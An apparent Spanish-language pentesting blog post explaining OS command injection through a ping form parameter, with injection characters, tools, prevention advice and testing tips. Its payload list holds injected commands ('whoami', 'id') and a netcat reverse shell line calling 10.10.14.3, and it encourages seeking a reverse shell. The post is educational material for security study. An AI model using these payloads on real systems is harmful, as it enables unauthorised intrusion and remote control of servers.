---
layout: post
title: "Command Injection: Cuando un parámetro te da acceso a todo el sistema"
author: "l1ttl3bugc4t"
date: "2025-06-09"
tags: [Command Injection, Pentesting, Seguridad Web, Red Team, Shell]
categories: [cuaderno, Red Team & Chill, CyberChallenges]
---

**Command Injection** es como meterle comandos al sistema desde un input web y lograr que los ejecute como si fueras el admin 😼💻  
Una vulnerabilidad clásica, poderosa… y a veces, fatal para el servidor.

---

## 🧠 ¿Qué es Command Injection?

Es una vulnerabilidad que ocurre cuando una aplicación **concatena entradas del usuario en comandos del sistema operativo** sin validación adecuada.  
El atacante puede inyectar comandos arbitrarios que el servidor ejecutará.

---

## 💣 Ejemplo básico

Supón que tienes un formulario que hace ping a una IP:

```
http://victima.com/ping?ip=127.0.0.1
```

Y el backend ejecuta:

```bash
ping 127.0.0.1
```

Pero si el input no está validado…

```
http://victima.com/ping?ip=127.0.0.1; whoami
```

El servidor ejecutará:

```bash
ping 127.0.0.1; whoami
```

¡Y listo! El atacante ve el usuario del sistema.

---

## 🧪 Payloads comunes

```bash
127.0.0.1; whoami
8.8.8.8 && uname -a
localhost | id
; nc -e /bin/sh 10.10.14.3 4444
```

---

## 🧵 Caracteres de inyección

- `;` → separador de comandos
- `&&` → ejecuta si el anterior tuvo éxito
- `||` → ejecuta si el anterior falló
- `|` → redirige la salida al siguiente comando
- `` `comando` `` → ejecuta el contenido
- `$()` → evalúa el contenido dentro

---

## 🛠️ Herramientas útiles

- `Burp Suite` para interceptar y modificar parámetros
- `Commix` → automatiza inyecciones de comandos
- `curl` o `wget` para comprobar respuestas
- `netcat` y `socat` para obtener shells

---

## 🛡️ Cómo prevenirlo

- Nunca concatenes datos del usuario en comandos
- Usa funciones seguras como `subprocess.run()` en Python con `shell=False`
- Valida la entrada (IP, nombres, rutas)
- Usa listas blancas
- Escapa y sanitiza correctamente

---

## 📡 En pentesting

- Identifica funciones como ping, traceroute, nslookup
- Revisa si hay eco en la respuesta (reflejo del comando)
- Usa `time delay` para detectar cuando no hay salida directa
- Si logras ejecutar algo… ¡ve por una reverse shell!

---

## ✨ Conclusión

**Command Injection** no es solo una vulnerabilidad… es una puerta abierta al sistema si no se maneja bien.  
Una comilla mal colocada puede ser el inicio del fin 😈💥

> _"Dame una IP y te abriré una shell."_ — **l1ttl3bugc4t**

---
